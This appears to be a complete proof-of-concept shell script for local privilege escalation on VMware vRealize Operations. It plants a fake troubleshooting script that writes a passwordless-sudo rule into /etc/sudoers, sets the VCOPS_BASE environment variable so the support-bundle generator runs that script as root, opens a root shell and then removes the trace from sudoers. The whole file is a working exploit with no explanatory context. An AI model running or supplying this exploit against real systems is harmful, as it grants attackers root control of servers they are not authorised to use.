#!/bin/sh
mkdir -p poc
mkdir -p vmware-vcopssuite/utilities/bin/
cat <<EOT > vmware-vcopssuite/utilities/bin/gss_troubleshooting.sh
#!/bin/sh
echo "admin ALL = NOPASSWD: ALL" >> /etc/sudoers
EOT
chmod 755 vmware-vcopssuite/utilities/bin/gss_troubleshooting.sh
sudo VCOPS_BASE=poc /usr/lib/vmware-vcopssuite/python/bin/python /usr/lib/vmware-vcopssuite/utilities/bin/generateSupportBundle.py test > /dev/null 2>&1
sudo rm -rf poc
sudo rm -rf vmware-vcopssuite
sudo sh
sudo sed -i '$ d' /etc/sudoers